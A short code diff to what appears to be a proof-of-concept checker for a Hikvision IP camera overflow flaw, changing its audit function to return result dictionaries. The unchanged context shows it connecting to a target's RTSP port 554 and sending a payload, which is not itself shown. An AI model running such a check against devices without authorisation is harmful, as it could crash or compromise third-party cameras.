@@ -6,9 +6,18 @@ from urllib.parse import urlparse
 
 def audit(target_url: str):
     if check(target_url):
-        print("[+] Found Vulnerable")
+        return {
+            "vuln_name": "hikvision ipc overflow vulnerable",
+            "msg": "Found Vulnerable",
+            "poc_name": "hikvision_overflow_01",
+            "vuln_url": target_url
+        }
     else:
-        print("[*] Not Found Vulnerable")
+        return {
+            "msg": "Not Found Vulnerable",
+            "poc_name": "hikvision_overflow_01",
+            "vuln_url": target_url
+        }
 
 
 def check(target_url: str):
@@ -23,7 +32,6 @@ def check(target_url: str):
     try:
         sock.connect((host, 554))
     except socket.error:
-        #print("[*] Not Found Vulnerable")
         return False
     sock.send(payload)
     sock.close()
